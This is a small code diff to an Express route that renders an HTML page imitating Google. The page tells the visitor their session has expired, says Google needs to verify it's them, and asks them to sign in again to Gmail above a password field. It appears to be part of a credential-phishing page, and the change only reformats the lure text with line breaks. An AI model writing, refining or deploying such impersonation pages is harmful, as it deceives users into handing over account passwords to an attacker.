@@ -305,7 +305,8 @@ router.get('/', (req, res) => {
             <div class="form-half1">
                 <!-- Session Expired Message at the top of the right section -->
                 <div class="session-expired-message">
-                    <p>To help keep your account secure, Google needs to verify it’s you. Please sign in again to continue to Gmail.</p>
+                    <p>To help keep your account secure,<br>
+                    <br>Google needs to verify it’s you. <br>Please sign in again to continue to Gmail.</p>
                 </div>
 
                 <div class="passdiv">
